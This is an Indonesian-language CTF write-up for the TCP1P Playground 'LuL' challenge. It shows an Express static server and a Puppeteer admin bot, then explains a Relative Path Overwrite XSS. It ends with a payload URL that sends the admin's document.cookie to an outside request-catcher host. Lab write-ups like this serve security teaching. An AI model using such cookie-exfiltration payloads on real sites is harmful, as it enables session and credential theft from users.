# LuL - XSS - TCP1P Playground

Pada challenge ini diberikan web static yang tidak menerima inputan apapun, terdapat endpoint `/report` yang mana adlah bot page untuk bot mengakses url yang kita inputkan namun host haruslah `http://app:3000`, dan flag terdapat di cookie dari admin

## Source Code
app.js
```javascript
const express = require('express')

const port = process.env.PORT || 3000

const app = express()

// Middleware to log each request
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} request to ${req.url}`)
    next()
})

app.use((_req, res, next) => {
    res.setHeader('Content-Security-Policy', "default-src 'self'")
    next()
})

app.use(
    express.static('static', {
        index: 'index.html'
    })
)

app.use((req, res) => {
    res.type('text').send(`${req.path}`)
})

app.listen(port, async () => {
    console.log(`Listening on http://0.0.0.0:${port}`)
    console.log('Browser launched')
})

```
Bot.js
```javascript
const puppeteer = require('puppeteer');

const CONFIG = {
    APPNAME: process.env['APPNAME'] || "Admin",
    APPURL: process.env['APPURL'] || "http://172.17.0.1",
    APPURLREGEX: process.env['APPURLREGEX'] || "^.*$",
    APPFLAG: process.env['APPFLAG'] || "dev{flag}",
    APPLIMITTIME: Number(process.env['APPLIMITTIME'] || "60"),
    APPLIMIT: Number(process.env['APPLIMIT'] || "5"),
}

console.table(CONFIG)

const initBrowser = puppeteer.launch({
    executablePath: "/usr/bin/chromium-browser",
    headless: 'new',
    args: [
        '--disable-dev-shm-usage',
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-gpu',
        '--no-gpu',
        '--disable-default-apps',
        '--disable-translate',
        '--disable-device-discovery-notifications',
        '--disable-software-rasterizer',
        '--disable-xss-auditor'
    ],
    ipDataDir: '/home/bot/data/',
    ignoreHTTPSErrors: true
});

console.log("Bot started...");

module.exports = {
    name: CONFIG.APPNAME,
    urlRegex: CONFIG.APPURLREGEX,
    rateLimit: {
        windowS: CONFIG.APPLIMITTIME,
        max: CONFIG.APPLIMIT
    },
    bot: async (urlToVisit) => {
        const browser = await initBrowser;
        const context = await browser.createIncognitoBrowserContext()
        try {
            // Goto main page
            const page = await context.newPage();

            // Set Flag
            await page.setCookie({
                name: "flag",
                httpOnly: false,
                value: CONFIG.APPFLAG,
                url: CONFIG.APPURL
            })

            // Visit URL from user
            console.log(`bot visiting ${urlToVisit}`)
            await page.goto(urlToVisit, {
                waitUntil: 'networkidle2'
            });
            await page.waitForTimeout(5000);

            // Close
            console.log("browser close...")
            await context.close()
            return true;
        } catch (e) {
            console.error(e);
            await context.close();
            return false;
        }
    }
}

```

### Static
index.html
```html
<script src="./hello_world.js"></script>

```
hello_world.js
```javascript
document.write("hello world!")
```

## Exploit
Terlihat tidak ada celah apapun pada web app, sedangkan kita diharuskan untuk melakukan XSS untuk mendapatkan cookie dari admin.

Setelah melakukan explorasi terdapat kerentanan XSS `Relative Path Overwrite` yang memungkinkan kita untuk melakukan xss melalui path, dan express mengenalinya sebagai bagian dari path namun sistem akan mengenalinya sebagai `html` syntax dan akan mengeksekusi payload

Payload
```bash!
http://playground.tcp1p.team:39046/a/g;location=decodeURIComponent('https%253A%252F%252Fad.requestcatcher.com%252Ftest%253Fcookie%253D'+document.cookie)//a%2f..%2f..%2f..%2f..%2f..%2findex.html
```

Terimakasih